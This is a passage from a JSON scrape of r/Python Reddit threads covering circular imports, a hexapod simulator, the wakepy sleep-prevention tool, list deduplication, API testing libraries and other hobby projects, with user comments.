                {
                    "author": "maurinhoandre",
                    "score": "2",
                    "content": "Hi. In fact I simplified the Field function. I simply inject the indexes creation parameters index, unique, text_index and default_language. As for documentation, I would be very happy for your collaboration, I already use mkdocs. https://pyodmongo.dev/"
                }
            ]
        }
    ]
},
{
    "post_author": "ALior1",
    "post_id": "1d50age",
    "post_score": "5",
    "post_time": "Friday, May 31, 2024 at 7:51:41 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Circler imports in Observer design pattern in Python",
    "media": [],
    "post_content": "So I'm trying to do a small refresher in design patterns and I reached the Observer pattern.\nAnd I'm encounter a circular import error that I'm not sure how to solve.\nAt first I had two files: `observers.py` and `subjects.py`, which each contained the abstract class and some concrete ones.\nBut because each had to know about the other, I got a circler import error.\nI tried to put them in the same file, but than the first cant use the second.\nAlso tried to put the Observer in the \"subjects.py\" file, textualy before \"Subject\", that worked, but not clear to me why.\nI know that in compiled languages, they just use an interface, but we dont have it in Python.\nTried to solved it in a various ways, but want to hear others, how you think this can be solved and opinons on this.\nThe base classes are:\nclass Subject(ABC):\n    \n    @abstractmethod\n    def attach(self, observer: Observer) -> None:\n        # The Observer is in the method parameters, so we need to import it\n        pass\n    \nclass Observer(ABC):\n    \n    @abstractmethod\n    def update(self, subject: Subject) -> None:\n        # The Subjectis in the method parameters, so we need to import it\n        pass",
    "comments": [
        {
            "author": "PowerfulNeurons",
            "score": "12",
            "content": "if it’s just for typing, you can do a tying import: from typing import TYPE_CHECKING if TYPE_CHECKING: from module_name import circular_referenced_class …"
        },
        {
            "author": "scrought",
            "score": "9",
            "content": "Take a look at Forward References from pep 484 https://peps.python.org/pep-0484/#forward-references",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "I prefer from __future__ import annotations so I can still use autocomplete and other editor features.",
                    "replies": [
                        {
                            "author": "InvaderToast348",
                            "score": "2",
                            "content": "I prefer from __future__ import annotations so I can still use autocomplete and other editor features.",
                            "replies": [
                                {
                                    "author": "athermop",
                                    "score": "2",
                                    "content": "FWIW, PyCharm understands string references and still does autocomplete and everything."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "WoodenNichols",
            "score": "6",
            "content": "Unless I am completely misunderstanding, the word is \"circular\", not \"circler\". Sorry. I'm a former technical writer. 😋",
            "replies": [
                {
                    "author": "BattlePope",
                    "score": "1",
                    "content": "It had to be said."
                }
            ]
        },
        {
            "author": "FailedPlansOfMars",
            "score": "2",
            "content": "Just put your abstract classes in their own files. And python does have the equivalent to interfaces they are called protocols.",
            "replies": [
                {
                    "author": "ALior1",
                    "score": "1",
                    "content": "tried it. didnt worked."
                }
            ]
        },
        {
            "author": "AdmiralBender",
            "score": "2",
            "content": "Use from __future__ import annotations which will allow forward references like this in the same file."
        },
        {
            "author": "ALior1",
            "score": "0",
            "content": "Maybe the solution is to use a mixin-like pattern?",
            "replies": [
                {
                    "author": "AstronomerTerrible49",
                    "score": "1",
                    "content": "just add double quotes around the Observer class"
                }
            ]
        }
    ]
},
{
    "post_author": "mikasarei",
    "post_id": "g2njfz",
    "post_score": "2768",
    "post_time": "Friday, April 17, 2020 at 12:00:31 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Hexapod Robot Simulator with only Numpy and Plotly Dash",
    "media": [
        "https://external-preview.redd.it/kd3-Q0nopKNH8QoDgClXsSov-g3xcjEtsep9kgSyDmk.png?width=640&crop=smart&format=pjpg&auto=webp&s=ddffb672d9633c59c68fbceea240b67ceca59e6b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "mikasarei",
            "score": "145",
            "content": "Here’s the repo https://github.com/mithi/hexapod-robot-simulator it would be really cool if a person or two could spend a couple of seconds to check it out (and maybe look at the issues as well) Thanks again!"
        },
        {
            "author": "Gwenju31",
            "score": "88",
            "content": "You did the inverse kinematics implementation from scratch ? I feel you"
        },
        {
            "author": "[deleted]",
            "score": "22",
            "content": "wtf thats amazing"
        },
        {
            "author": "m4nolito",
            "score": "16",
            "content": "One of the coolest things I saw today! 👏"
        },
        {
            "author": "ffollett",
            "score": "25",
            "content": "This is incredible and truly inspiring as I've had my eye on dash for a while but wasn't feeling confident about it's capabilities. I was clearly mistaken. Do you mind explaining to a noob what it means to build this project from first principles? I vaguely understand the term, but I'm fuzzy on it's application to a project like this. Perhaps because I would have no idea where to begin simulating a spider."
        },
        {
            "author": "inventiveEngineering",
            "score": "19",
            "content": "love the gui"
        },
        {
            "author": "Pok3maniac00",
            "score": "15",
            "content": "The giant enemy spider."
        },
        {
            "author": "FoxClass",
            "score": "7",
            "content": "I love the interface. I can't wait to check out the repo"
        },
        {
            "author": "Pebaz",
            "score": "7",
            "content": "So um like, dude that's amazing what in the world Mad props on this for sure"
        },
        {
            "author": "geetanshjindal",
            "score": "18",
            "content": "Amazing work bro!!"
        }
    ]
},
{
    "post_author": "fohrloop",
    "post_id": "1d5ya3k",
    "post_score": "153",
    "post_time": "Sunday, June 2, 2024 at 1:12:15 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Keep system awake (prevent sleep) using python: wakepy",
    "media": [
        "https://github.com/fohrloop/wakepy"
    ],
    "post_content": "Hi all,\nI had previously a problem that I wanted to run some long running python scripts without being interrupted by the automatic suspend. I did not find a package that would solve the problem, so I decided to create my own. In the design, I have selected non-disruptive methods which do not rely on mouse movement or pressing a button like F15 or alter system settings. Instead, I've chosen methods that use the APIs and executables meant specifically for the purpose.\nI've just released wakepy 0.9.0 which supports Windows, macOS, Gnome, KDE and freedesktop.org compliant DEs.\nGitHub: https://github.com/fohrloop/wakepy\nComparison to other alternatives: typical other solutions rely on moving the mouse using some library or pressing F15. These might cause problems as your mouse will not be as accurate if it moves randomly, and pressing F15 or other key might have side effects on some systems. Other solutions might also prevent screen lock (e.g. wiggling mouse or pressing a button), but wakepy has a mode for just preventing the automatic sleep, which is better for security and advisable if the display is not required.\nHope you like it, and I would be happy to hear your thoughts and answer to any questions!",
    "comments": [
        {
            "author": "earthpiper",
            "score": "119",
            "content": "I for one will be positive of your post rather than saying \"The OS can do it\" previous peeps I think are missing the point. What if you have a long running task and you don't want to change OS settings... You just want it to happen while the task is running. Or if you don't have access to these settings. Or this task runs on multiple operating systems and you don't want to manage this for every possible OS under the sun. Good job =)",
            "replies": [
                {
                    "author": "Briaireous",
                    "score": "32",
                    "content": "Agreed, so many are overlooking sys admins preventing or locking them out of OS settings because it’s a managed device. Not to mention sanctioned software installs of 3rd party software on organization hardware."
                },
                {
                    "author": "FunkBlazar",
                    "score": "17",
                    "content": "Agreed. I'm assuming you can just add this to your app and have the system stay awake while running it."
                },
                {
                    "author": "PercentageLoud1903",
                    "score": "9",
                    "content": "Agreed! 'oh OS can just do it' , well yes but my machine is set up how I like it, I don't want to be constantly toggling those settings when I have long running analyses or training jobs. This is neat, thanks OP. Also a CONTEXT MANAGER FOR USE WITHIN YOUR PYTHON CODE, that's incredibly handy, more so than caffeine."
                },
                {
                    "author": "FoolForWool",
                    "score": "2",
                    "content": "Amphetamine is what I use when I need to keep my system awake when im running a long process. Just select a time range or just indefinite and it doesn’t let your pc sleep."
                },
                {
                    "author": "sphexie96",
                    "score": "2",
                    "content": "You are right, but also os can do it. On unix like there is caffeinate, which can for example keep the os awake while a specific task/pid is alive."
                },
                {
                    "author": "runawayasfastasucan",
                    "score": "2",
                    "content": "Holy shit \"you can do it manually\" is the worst response to any program. Imagine wanting to fiddle around in the settings when it can just happen automatically when you need it to."
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "-5",
                    "content": "",
                    "replies": [
                        {
                            "author": "chrisforrester",
                            "score": "6",
                            "content": "Which of these can I use in a Python script without requiring users to install extra software?"
                        },
                        {
                            "author": "chrisforrester",
                            "score": "1",
                            "content": "No answer? But you seemed so confident."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Cybasura",
            "score": "7",
            "content": "So simple, but so...important Good work!"
        },
        {
            "author": "runawayasfastasucan",
            "score": "24",
            "content": "Sorry for all the people that neither appreciate solving something with programming nor can imagine the use case of this and thus assume there is none.  This is really a neat package for those long running tasks where you want to lock your computer but want to avoid sleep! Thank you, will check it out 😊 Edit: to the one replying to this comment then blocking me, its not useless, its just your imagination that is a bit lacking. Edit2: First you say its useless and now you are saying that there are others app doing the same. Guess that means that it isnt useless, and has a range of use cases then. Nice to have a cross plattform python implementation to integrate into my python scripts."
        },
        {
            "author": "rawrjagwar",
            "score": "7",
            "content": "This is perfect, think I’ll implement it in my current project"
        },
        {
            "author": "Frix_x",
            "score": "6",
            "content": "That's perfect! Thanks for sharing! I've done a small PowerShell script that calls an old non existing key on my keyboard but it's not that clean and I prefer your solution better. For those wondering why I need this as \"the os can do it\": at work they enforced a GPO to screenlock computers after 3 min of inactivity... And even with admin rights we can't change it as it's always restored automatically."
        },
        {
            "author": "elyisgreat",
            "score": "5",
            "content": "Cool! I personally use a bash script that calls systemd-inhibit, but of course that's not a cross platform solution. Is it possible to add a mode that blocks sleep and screen locking but not screen idle? That tends to be my default use case (maybe you could call it -o, --keep-open complimenting --keep-running and --presentation)",
            "replies": [
                {
                    "author": "fohrloop",
                    "score": "4",
                    "content": "Let me clarify that you would like to see a mode which would block automatic screenlock and automatic suspend, but let the system automatically close the display or start a screensaver? That's an interesting idea! What would be the use case for this? Is it to run some script home (=no screenlock needed) on a laptop, and to switch off the display automatically when you're not sitting in front of it anymore..? Yeah the name could be keep.open or even keep.unlocked, or it could be an additional argument to keep.running, like inhibit_screenlock=True. I created wakepy/#334 for this. Please feel free to comment or contribute there as well :) I also created wakepy/#335 to consider the systemd-inhibit method to add even wider support."
                }
            ]
        }
    ]
},
{
    "post_author": "themonsterpus",
    "post_id": "8fztrr",
    "post_score": "2444",
    "post_time": "Monday, April 30, 2018 at 5:26:17 PM GMT+3",
    "flair_text": "",
    "post_title": "xkcd: Python Environment",
    "media": [
        "https://imgs.xkcd.com/comics/python_environment.png",
        "https://external-preview.redd.it/UZcQKHvSIsi47b3Xb2OM1F_8LN8wACAYBsEBJBbOH1U.png?auto=webp&s=18d7f227a52966e4db9bed0133cae07f68b6a793"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ppgDa5id",
            "score": "413",
            "content": "For future reference, original link. Because the real joke is in the title. The Python environmental protection agency wants to seal it in a cement chamber, with pictoral messages to future civilizations warning them about the danger of using sudo to install random Python packages.",
            "replies": [
                {
                    "author": "themonsterpus",
                    "score": "57",
                    "content": ""
                }
            ]
        },
        {
            "author": "solostman",
            "score": "80",
            "content": ""
        },
        {
            "author": "the_hoser",
            "score": "197",
            "content": "It's really easy to avoid this problem if you treat your python environments as disposable artifacts of your projects."
        },
        {
            "author": "Tweak_Imp",
            "score": "117",
            "content": "I really dont understand why python and its dependencies can be such a big mess. Why isnt there just one python installer that installs the current version of python, sets every setting you need by himself like the PATH and then has a manager for all packages. Just search and load from the manager and if you dont want a package any more, delete it and remove all dependencies that are not needed by others. Is that really so hard to do?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d59yfj",
    "post_score": "1",
    "post_time": "Saturday, June 1, 2024 at 3:00:35 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "hxnyge",
    "post_score": "2761",
    "post_time": "Saturday, July 25, 2020 at 5:52:06 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a project that generates the graph",
    "media": [
        "https://preview.redd.it/x8ueald2o0d51.png?auto=webp&s=ab1fb645a309da4bc56703db23bd0c57ef4cf9f0",
        "https://i.redd.it/x8ueald2o0d51.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "desertfish_",
            "score": "153",
            "content": "no need to make your own reversed_range you can simply do range(X, -1, -1)"
        },
        {
            "author": "abkfinance",
            "score": "100",
            "content": "Very cool"
        },
        {
            "author": "aidankkm",
            "score": "45",
            "content": "how do you do the finished in 0.3 seconds text. i remember i saw it in a video but was too lazy."
        },
        {
            "author": "Anzzze",
            "score": "34",
            "content": "make an UwU graph"
        },
        {
            "author": "[deleted]",
            "score": "49",
            "content": "Source: https://github.com/jeel2331/Graph.git"
        },
        {
            "author": "codingstudent7",
            "score": "14",
            "content": "This seems like a fun project to try. Well done!"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "nice, I would extend the function you use to grab indices which are larger than 10, instead of just grabbing the last digit."
        },
        {
            "author": "mathisfun271",
            "score": "8",
            "content": "I made a similar program once, but instead of using asterisks, I used three types of dots ( . , · , ˙ ) for more precise plotting. It ended like this: 3┤ │                    ..· │                .·˙˙ 2┤            .·˙˙ │         .˙˙ │        · 1 ┤      ·˙ │     · │  ··˙ 0 ┤·· └┬─────┬─────┬─────┬───── 0     1     2     3"
        },
        {
            "author": "fecesmuncher69",
            "score": "5",
            "content": "Thanks a lot! I will definitely try it. Is that a module you created or is it available for everyone? I have a project doing some calculations like distance between 2 points and things like that, a graph is a major improvement for it"
        },
        {
            "author": "Tadabito",
            "score": "4",
            "content": "You can try drawing the chart with braille characters, that would give you 3x vertical and 2x horizontal resolution."
        }
    ]
},
{
    "post_author": "radumarias",
    "post_id": "1d5jv4i",
    "post_score": "0",
    "post_time": "Saturday, June 1, 2024 at 1:16:52 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "New project: A blend of Rust and Python: speeding up Python encryption",
    "media": [
        "https://github.com/radumarias/rencrypt-python](https://github.com/radumarias/rencrypt-python)"
    ],
    "post_content": "[https://github.com/radumarias/rencrypt-python](https://github.com/radumarias/rencrypt-python)\n* **What My Project Does**\nA Python encryption library implemented in Rust. It supports AEAD with AES-GCM and ChaCha20Poly1305. It uses ring to handle encryption.If offers slightly higher speed compared to other Python libs, especially for small chunks of data. The API also tries to be easy to use but it's more optimized for speed than usability.\nSo if you are open to experiment and want to achieve the highest possible encryption speed, consider giving it a try.\n* **Target Audience**\nThis is just a toy project as a learning experience\n* **Comparison**\nThis is slightly faster than PyFLocker which from my benchmarks is the faster among other Python libs like cryptography, NaCl (libsodium), PyCryptodome",
    "comments": [
        {
            "author": "rmjss",
            "score": "4",
            "content": "Yo dawg, you don’t have to make posts for your project multiple times. It was interesting to read about the first time but it makes it harder to care about what you’re saying when you blast everyone again about it 😉",
            "replies": [
                {
                    "author": "radumarias",
                    "score": "0",
                    "content": "sorry about that, I got an error message that the post was removed as it doesn't contain some info and added a new post to include that info"
                }
            ]
        },
        {
            "author": "fortunatefaileur",
            "score": "1",
            "content": "I think it’s fine and fun to write crypto code to learn, but there is zero need to post it and encourage people to use, even if you then put a disclaimer below that. You can just write code without telling anyone.",
            "replies": [
                {
                    "author": "radumarias",
                    "score": "0",
                    "content": "I humble think that maybe posts like this could encourage more people to get into cryptography and learn more, even from such learning projects like this, instead of just \"leave this to the experts\", because how otherwise those experts become to be"
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d60h2g",
    "post_score": "11",
    "post_time": "Sunday, June 2, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Ok_Crab1603",
            "score": "4",
            "content": "I’m just starting out with python though I am mostly interested in Twitter bots and web scraping, could anyone point me in the direction of some good learning materials please",
            "replies": [
                {
                    "author": "hikingsticks",
                    "score": "3",
                    "content": "John Watson Rooney on YouTube. Scrape this site. Com"
                }
            ]
        },
        {
            "author": "copper_fox08",
            "score": "4",
            "content": "I am attempting to change careers to a Python Backend Developer, fingers crossed. Currently working on two projects at the moment. The first one is guided by my mentor and it is a huge learning opportunity for a restaurant inventory management app. This project includes MySQL, Python, and soon will work on the front end using HTML, CSS, Bootstrap and Flask. The profect IMO has turned into something pretty advanced as we work through even basic CRUD operations. My mentor has been doing this for over 20 years and is self taught so I am extremely lucky. The second app is just something for me to do solo, along with ChatGPT, as something a little more simple so I can have some rewards and see something come together more rapidly. Kind of a break from the intense learning I am doing for the first project. This is will be a web app for a bicycle rental company. This will also include MySQL, Python, Flask, HTML, CSS and Bootstrap. For this I will be attempting to take bookings, use a calendar on the app to display availability and times. Pricing, live customer support chat, automatic email confirmations and so on. This has all been such a jouney and TBH everyday I feel like this is never going to work out and I have no idea how to break into the job market. But I am lucky for the opportunity to change my career and I cant throw this away. I am new to reddit and dont see any options here to post images. Here is the GitHub link to the first project https://github.com/M-Studley/coffee_shop_inventory_app"
        },
        {
            "author": "InvaderToast348",
            "score": "2",
            "content": "A GUI to extend my homeserver management scripting. The current scripts control and generate all the config, but moving the dynamic config to a GUI will be pretty nice. I'm testing a few different setups, currently on tkinter with ttkbootstrap but have also had a go with webdev. ttk.Notebook has certainly been an interesting bit of code to work with, as I have never used tkinter events & virtual events before and managing the tabs has been tricky. It also uses subprocess to hook into the OS to retrieve data such as IP addresses, DNS config, etc... It's a fairly large project but I'm still getting through it. It's just quite boring creating tens or hundreds of buttons and inputs and linking them to the config dicts. I have no idea how many more I have left but I'll find a nice long YT video to play in pip and try to get it done."
        },
        {
            "author": "zby",
            "score": "2",
            "content": "Just published a blog post: \"How to turn any python function into an LLM tool with LLMEasyTools\": https://zzbbyy.substack.com/p/how-to-turn-any-python-function-into"
        },
        {
            "author": "Select_Promotion49",
            "score": "1",
            "content": "I´m working on some API python based, being new to all this world it's very exciting and I hope to become really good at it this year"
        },
        {
            "author": "Expensive-Rub3117",
            "score": "1",
            "content": "starpig1129/PigPig-discord-LLM-bot: A discord bot based on multi-modal LLM that interacts with discord through natural language (github.com) It is a discord bot based on the multi-modal language model discord bot language model"
        },
        {
            "author": "Background-Main-7427",
            "score": "1",
            "content": "implementing a pseudo SOAP webservice with a bank that requires to encrypt the original message so you can't really use suds or zeep , because the encrypted message is transmitted to another endpoint and then the bank unencrypts and accesses the webservice in their own machines."
        }
    ]
},
{
    "post_author": "Etheo",
    "post_id": "es8dai",
    "post_score": "2415",
    "post_time": "Wednesday, January 22, 2020 at 9:59:00 AM GMT+3",
    "flair_text": "",
    "post_title": "Work laptop doesn't allow minesweeper? I'm gonna build my own minesweeper, with blackjack, and hookers! In fact, forget the hookers!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Etheo",
            "score": "147",
            "content": "I started this during the slow season of Christmas when most of the office was gone. It started very simple and then eventually I learned a lot on better packaging, using tkinter, and git, so it was a great experience! I'm not a developer by trade but I just love to code. Here's my very infantile github for your entertainment, it's bound to have a bunch of bad coding practices: https://github.com/r-ook/pymsweeper"
        },
        {
            "author": "python_js",
            "score": "98",
            "content": "nice! can you maybe substitute the bombs for hookers as a compromise"
        },
        {
            "author": "dparks71",
            "score": "39",
            "content": "\"Minesweeper? Fuck no our employees can't be trusted with that, disable it!\" \"Arbitrary code execution? We'll allow it, they aren't that smart.\" Gotta love I.T. teams thought processes sometimes..."
        },
        {
            "author": "foobar93",
            "score": "34",
            "content": "Nice! As noone has mentioned it yet, there is also a \"fair\" Minesweeper that only kills you if it can prove you guessed: https://pwmarcz.pl/kaboom/"
        },
        {
            "author": "Barafu",
            "score": "17",
            "content": "Wow, you have a talent for UI design! You made Tkinter not too ugly !!! That is quite an accomplishment."
        },
        {
            "author": "FlossCat",
            "score": "8",
            "content": "What cruel dystopian corporation do you work for that won't even let you play minesweeper on a work laptop?"
        },
        {
            "author": "pyfrag",
            "score": "5",
            "content": "Am I the only one who doesn't understand the Blackjack variation?"
        }
    ]
},
{
    "post_author": "crawles89",
    "post_id": "1d4we3f",
    "post_score": "4",
    "post_time": "Friday, May 31, 2024 at 5:03:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "AndroidWorld — Build and test AI agents on Android",
    "media": [
        "https://www.rabbit.tech/",
        "https://github.com/google-research/android_world",
        "https://github.com/xlang-ai/OSWorld"
    ],
    "post_content": "What it does:\nIt is for building AI agents that perform tasks for you on Android using LLMs. Agents read the screen and perform actions like clicking, typing, and dragging.\nIt includes a test suite of 116 tasks across 20 real-world apps to evaluate agent performance. Think of each task like a unit test, with a setup, evaluation, and tear down procedure. Every task is written in Python. The most powerful agents should be able to pass all of them.\nTarget Audience:\nAnyone looking to experiment with LLM for controlling Android UIs. You can download any app you’d like and test out the default agent, M3A, on it. Just give it a task like “Show my most recent purchases on Amazon.” You can also build your own agent.\nComparison\nFor desktop OSes, there is OSWorld, although it requires costly commercial software (VMWare) to run. AndroidWorld only requires free Android emulator.\nWhile this is OSS and for research, the closest commercial product would be the Rabbit R1. They should test their agent on AndroidWorld to improve accuracy before shipping again :P\nLink to repo: https://github.com/google-research/android_world",
    "comments": []
},
{
    "post_author": "Content_Ad_4153",
    "post_id": "1d5j23c",
    "post_score": "28",
    "post_time": "Saturday, June 1, 2024 at 12:17:36 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PDF Reports for SonarQube Analysis ( Community Edition ) ",
    "media": [
        "https://pypi.org/project/redcoffee/",
        "https://github.com/Anubhav9/RedCoffee"
    ],
    "post_content": "Problem Statement\nI recently explored SonarQube for static code analysis. While it’s a great tool, the free edition lacks the ability to generate PDF reports, making it hard to share issues. There was no maintained plugin available, so I decided to solve this problem myself.\nTarget Audience\nThis started as a hobby/side project, but I wanted to share it in case others find it useful. I'm open to suggestions and feedback!\nComparison with Similar Tools\nThere was only one similar tool in the Sonar Marketplace, but it’s no longer maintained.\nProject Details\nI've developed and published a Python library called RedCoffee, which generates PDF reports from SonarQube analysis. You can find it on PyPi and GitHub.\nLinks:\nPyPi: RedCoffee\nGitHub: RedCoffee Repository\nFeel free to check it out and let me know your thoughts!",
    "comments": [
        {
            "author": "LingonberryOrnery693",
            "score": "2",
            "content": "Looks like a useful tool. I have created a sonarqube CLI, cheekily called \"sonarless\" to enable developers for scanning without need to have headache of setting up a server. For my \"report\", I just give the developer a json so that they can monitor the progress and use it for some check. https://github.com/gitricko/sonarless I will check out your python code to see what reports it gives... ideally, I was thinking about how difficult to give a html clickable report so that they can do into details of the code in question for more detail analysis without sonar server hosted"
        }
    ]
},
{
    "post_author": "Littlebudddy_321",
    "post_id": "1d93a82",
    "post_score": "3",
    "post_time": "Thursday, June 6, 2024 at 1:49:39 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "New Lands RPG (Play testers welcome)",
    "media": [
        "https://github.com/littlebudddy321/New-Lands-RPG"
    ],
    "post_content": "Good \"time of day\" my fellow peeps\nWhat my project does:\nI wanted to share my Python game I've been slowly working on over the past... I'd say 1.5 years. It is a simple texted based resource collection game where you travel to different areas, collect resources, sell them in town but be careful there are bandits about, so don't go too far without having some cooked fish on you...\nTarget Audience:\nI'd say its mainly for well... everyone, anyone who enjoys text based games and anyone who wants to chill out on a rainy day when all the other games in their steam library are looking boring and they just want to relax...\nComparison:\nI'd say Colossal cave adventure but that is a much bigger... better... game I would call it, but this is just a simple \"learning python\" project I started a while ago and just recently got back into it so I said what the heck why not finish the game. but now I'm stuck as to what to do next, so I thought I'd ask for play testers to come and tell me how bad my coding and game was so I could try and make it more playable... because lord knows I made it so I know how to play it but what about other people.\nyou can find the code on GitHub: https://github.com/littlebudddy321/New-Lands-RPG",
    "comments": []
},
{
    "post_author": "Jump2Fly",
    "post_id": "l8jvev",
    "post_score": "2399",
    "post_time": "Saturday, January 30, 2021 at 2:34:11 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "I created a video about Neural Networks that is specifically aimed at Python developers! If you understand the Code, you understand how to create a Neural Network from Scratch! The video took me 200h to create and is fully animated! Hope it helps you guys :)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "dreamlax",
            "score": "62",
            "content": "Has a very 3blue1brown vibe to it!",
            "replies": [
                {
                    "author": "coolcastform",
                    "score": "35",
                    "content": "Yep 100% uses manim, a librery 3blue initially wrote. It's a pain in the ass to use it. At least it was when I tried 1 year ago."
                },
                {
                    "author": "Jump2Fly",
                    "score": "35",
                    "content": "Thanks! I'm using the python library that he created and published for the animations (manim).",
                    "replies": [
                        {
                            "author": "sandusky_hohoho",
                            "score": "10",
                            "content": "I kinda think you should have said that you used Manim at the end of the video rather than \"Animations were written in Python\"",
                            "replies": [
                                {
                                    "author": "Jump2Fly",
                                    "score": "11",
                                    "content": "Thanks for the feedback! I've mentioned manim and 3blue1brown in the description. But its a good point. I'll rethink about it for the next one that I make with manim."
                                }
                            ]
                        },
                        {
                            "author": "bisforbenis",
                            "score": "3",
                            "content": ""
                        },
                        {
                            "author": "AissySantos",
                            "score": "1",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "Succotash_Playful",
            "score": "58",
            "content": ""
        },
        {
            "author": "Sigg3net",
            "score": "17",
            "content": "I will definitely watch this, got spare time coming up after the weekend. Thanks!"
        }
    ]
},
{
    "post_author": "sebawitowski",
    "post_id": "jfx7wy",
    "post_score": "2741",
    "post_time": "Thursday, October 22, 2020 at 1:37:23 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "How to quickly remove duplicates from a list?",
    "media": [
        "https://i.redd.it/kppp9jkojmu51.png",
        "https://preview.redd.it/kppp9jkojmu51.png?width=640&crop=smart&auto=webp&s=e8e38774490b14a8a8176ac666990a43e1d78ed1"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "fiskfisk",
            "score": "417",
            "content": "Good points! Try to avoid posting code as images - it's bad when it comes to accessibility (bad eyesight, etc.), it's bad when it comes to copyability (although it's nice that we're able to emulate the 80s of typing in code from magazines) and it doesn't really work for searching.",
            "replies": [
                {
                    "author": "sebawitowski",
                    "score": "63",
                    "content": "Thanks! I like to use the screenshots from carbon.now.sh because you can immediately skim what this post is about. I would love to include the text version as well, but reddit doesn't allow adding an image AND text together. I tried putting it in the comments, but usually, that comment gets lost at the bottom.",
                    "replies": [
                        {
                            "author": "livingdub",
                            "score": "68",
                            "content": "It's also not compliant in terms of accessibility. Blind people have no way to access this kind of content, unless you want to dump the whole code snippet in the image metadata."
                        },
                        {
                            "author": "mikeblas",
                            "score": "27",
                            "content": "I cant read the text in this post because of the light pirple text on dark ourple background. Are you able to provide an improved version?"
                        },
                        {
                            "author": "oh_lord",
                            "score": "4",
                            "content": "Maybe just throw a (code in comments) to the title so people who need that option know to look for it. Alternatively, you could post it as a self-link with the image in there and the code duplicated (behind a spoiler tag if you wanted it to be more succinct)."
                        },
                        {
                            "author": "mishugashu",
                            "score": "4",
                            "content": "reddit doesn't allow adding an image AND text together Yes it does. Do a text post, and add images using their WYSIWYG editor. It'll post the image in-line. Note this only works for posts, not comments. You also have to be on the \"new\" reddit to see in-line. Old reddit clients will see a link."
                        },
                        {
                            "author": "benargee",
                            "score": "2",
                            "content": "I think the disadvantages outweigh the advantages here."
                        },
                        {
                            "author": "zanfar",
                            "score": "2",
                            "content": "It's also not searchable, copyable, or scalable. It's 104,000 bytes instead of 570 bytes, and doesn't reflow on a mobile device. What's the point of teaching someone something if they can't experiment with it? I also don't agree that the image provides any benefit for \"skimming\"."
                        }
                    ]
                },
                {
                    "author": "-Django",
                    "score": "7",
                    "content": "I like images, they're more captivating to look at"
                },
                {
                    "author": "lazerwarrior",
                    "score": "1",
                    "content": "Images are probably posted because they get picked up by the algorithm for upvotes"
                }
            ]
        },
        {
            "author": "Aardshark",
            "score": "69",
            "content": "If you used a set in your loop example, then it would perform well and retain order. def uniques(duplicates): unique = [] seen = set() for element in duplicates: if element not in seen: unique.append(element) seen.add(element) return unique From my tests, this actually performs better than the OrderedDict implementation in Python 2.7 and 3. This is particularly true on Python 2.7, where it runs in about 1/15 of the time.",
            "replies": [
                {
                    "author": "mobsterer",
                    "score": "14",
                    "content": "simple: don't use python 2"
                }
            ]
        },
        {
            "author": "sebawitowski",
            "score": "38",
            "content": "And this simple one-liner is (probably unsurprisingly) an order of magnitude faster! You can find the benchmarks in this blog post: https://switowski.com/blog/remove-duplicates Also, something important to keep in mind (that I forgot to include in the original image) is that this only works for hashable elements on the list. If you have a list of lists, sets, or dictionaries, you can't convert it to set and you are left with the \"ugly\" for loop."
        },
        {
            "author": "SherlockPotato",
            "score": "19",
            "content": "Is 1_000_000 the same as 1000000 here?"
        }
    ]
},
{
    "post_author": "Eastern_Reporter_834",
    "post_id": "1d5k2ty",
    "post_score": "15",
    "post_time": "Saturday, June 1, 2024 at 1:32:05 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "ReqFlow - Simplifying API Testing with Python",
    "media": [
        "https://reqflow.org/",
        "https://github.com/olxxi/ReqFlow"
    ],
    "post_content": "Hello everyone!\nWhat My Project Does\nI'm excited to share ReqFlow - a Python library designed to make API testing straightforward and efficient. It offers a fluent interface for building and validating HTTP requests, making it a handy tool for small-sized testing frameworks or utilities. While it's still in development and might have some bugs, I would love your feedback and contributions to improve it!\nTarget Audience\nIt would be suitable for beginners due to its reduced entry barrier and also supports advanced use cases with a RestAssured-like approach.\nComparison\nWhile standard approaches for API testing with Python (e.g., requests) definitely makes sense, ReqFlow provides a more fluent and expressive syntax, making it easier to write and understand tests.\nCheck it out on GitHub and the docs at reqflow.org.\nAll feedback and contributions are welcome! 🙂",
    "comments": [
        {
            "author": "ryukinix",
            "score": "2",
            "content": "Interesting. I use responses for unit tests and directly client of FastAPI for integration tests. I don't see directly a good case for unit tests on my scheme for testing, but maybe for integration tests can be a good case.",
            "replies": [
                {
                    "author": "Eastern_Reporter_834",
                    "score": "1",
                    "content": "Definitely makes sense when you have access to the app's code and it’s Python-based. The more straightforward, the better. As mentioned, ReqFlow can also be used as a tool for integration tests, especially when you don’t have access to the codebase or if the API is not written in Python."
                }
            ]
        },
        {
            "author": "YesterdayDreamer",
            "score": "1",
